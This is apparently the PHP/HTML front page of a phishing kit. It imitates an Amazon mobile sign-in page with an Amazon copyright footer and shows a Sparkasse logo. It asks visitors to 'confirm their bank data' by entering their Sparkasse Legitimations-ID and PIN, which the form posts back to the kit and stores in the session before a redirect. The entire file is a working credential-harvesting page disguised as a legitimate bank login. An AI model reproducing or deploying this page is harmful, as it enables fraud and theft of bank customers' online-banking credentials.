<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ember a-transition a-transform a-opacity a-border-image a-border-radius a-box-shadow a-text-stroke a-text-shadow a-mobile a-ios a-touch-scrolling a-transform3d a-gradients a-local-storage a-textarea-placeholder a-input-placeholder a-autofocus a-webworker a-history a-drag-drop a-svg a-canvas a-video a-audio a-js a-touch a-mobile a-ws a-audio a-video a-canvas a-svg a-drag-drop a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-19ax5a9jf="mongoose" data-aui-build-date="3.17.5.1-2017-04-11">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title><?php echo $title ?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<link rel="stylesheet" href="src/css/51DPEdT1dL.css">
		<link rel="stylesheet" href="src/css/AuthenticationPortalAssets-00b5524f401f34fc3868ad90d4aa679bf.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
	</head>

  <body class="a-color-offset-background  ap-locale-de_DE a-m-de a-aui_51744-c a-aui_57326-c a-aui_72554-c a-aui_83815-c a-aui_86171-c a-aui_96511-t1 a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_noopener_84118-t1 a-aui_ux_102912-c a-aui_ux_59374-c a-aui_ux_60000-c a-aui_ux_92006-t1 a-aui_ux_98513-c a-dex_92889-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready" style="">
		<div id="a-page">
			<div class="a-section a-spacing-none">
				<link rel="stylesheet" href="src/css/51b-EJ2JOWL.css">
				<style type="text/css">
					<!--
					.nav-sprite-v3 .nav-sprite {
					background-image: url(src/img/sky_webnav_V1_sprite_1x._CB508122268_.png);
					background-repeat: no-repeat;
					}
					.nav-spinner {
					background-image: url(src/img/snake._CB192194539_.gif);
					}
					-->
				</style>

				<header class="nav-mobile nav-locale-de nav-lang-de nav-ssl nav-unrec nav-blueheaven">
					<div id="navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3">
						<div id="nav-logobar">
							<div class="nav-left">
								<div id="nav-logo">
									<a href="#" class="nav-logo-link" tabindex="">
										<span class="nav-logo-base nav-sprite"></span>
										<span class="nav-logo-ext nav-sprite"></span>
										<span class="nav-logo-locale nav-sprite"></span>
									</a>
								</div>
							</div>
							<div class="nav-right"></div>
						</div>
					</div>
				</header>
			</div>

			<div class="a-container">
				<div class="a-section a-spacing-none"></div>
				<div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>

				<div class="a-section auth-pagelet-mobile-container">

					<div id="auth-alert-window" class="a-box a-alert a-alert-error" style="display:<?php echo ((isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) ? "block" : "none") ?>">
						<div class="a-box-inner a-alert-container">
							<h4 class="a-alert-heading">Ein Problem ist aufgetreten:</h4>
							<div class="a-alert-content">
								<ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
									<li id="auth-email-missing-alert" style="display:<?php echo ((isset($_SESSION['user_err']) || isset($_SESSION['pass_err'])) ? "block" : "none") ?>">
										<span class="a-list-item">
											<?php
												if (isset($_SESSION['user_err'])) { echo "Bitte geben Sie Ihre Legimitations-ID ein!"; unset($_SESSION['user_err']); }
												if (isset($_SESSION['pass_err'])) { echo "<br/>Bitte geben Sie Ihr PIN ein!"; unset($_SESSION['pass_err']); }
											?>
										</span>
									</li>
								</ul>
							</div>
						</div>
					</div>

					<form name="signIn" method="post" novalidate="" action="index.php" class="auth-validate-form auth-clearable-form fwcim-form" formnovalidate>
						<div class="a-row">
							<div class="a-section a-spacing-extra-large">
								<h1 class="a-spacing-small a-spacing-top-small a-text-left">
								<img src="src/sparkasse_img/if5_spk_logo.gif" style="width:100%;max-height:100px;height:10%"/>
								<br/>
								Anmeldung Sparkasse
								</h1>
								<p>
									Bitte bestätigen Sie Ihre Bank-Daten durch eine Anmeldung bei Ihrer Sparkasse.
								</p>
							</div>
						</div>

						<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
							<label class="a-form-label auth-mobile-label">
								Legitimations-ID
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="ob_sp_username" name="ob_sp_username" placeholder="Legitimations-ID" value="<?php echo (isset($_SESSION['ob_sp_username']) ? $_SESSION['ob_sp_username'] : ""); ?>" maxlength="30" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								PIN
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="ob_sp_password" name="ob_sp_password" placeholder="PIN" value="<?php echo (isset($_SESSION['ob_sp_password']) ? $_SESSION['ob_sp_password'] : ""); ?>" maxlength="5" type="password">
							</div>
							
						</div>
						
						<div class="a-row"></div>

						<div class="a-section">
							<div class="a-button-stack">
								<span id="auth-signin-button" class="a-button a-spacing-extra-large a-button-span12 a-button-primary auth-share-credential-off">
									<span class="a-button-inner">
										<input id="signInSubmit" name="sendOB_Login_x" tabindex="6" class="a-button-input" aria-labelledby="auth-signin-button-announce" type="submit" formnovalidate>
										<span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
											Fortfahren
										</span>
									</span>
								</span>
								
							</div>
						</div>
					</form>
				</div>

				<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
					<div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">

						<div class="icp-container-mobile">
							<style type="text/css">
								#icp-touch-link-language { display: none; }
							</style>    

							<a href="#" class="icp-touch-link-2" id="icp-touch-link-language">
								<div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span>
							</a>

							<style type="text/css">
								#icp-touch-link-country { display: none; }
							</style>
							
							<a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
								<span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span>
							</a>
						</div>

						<ul class="nav-ftr-horiz">
							<li class="nav-li"><a href="#" class="nav-a">Unsere AGB</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Datenschutzerklärung</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Impressum</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Cookies &amp; Internet-Werbung</a></li>
						</ul>
						<div id="nav-ftr-copyright">© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</div>
					</div>
				</footer>
			</div>
		</div>
	</body>
</html>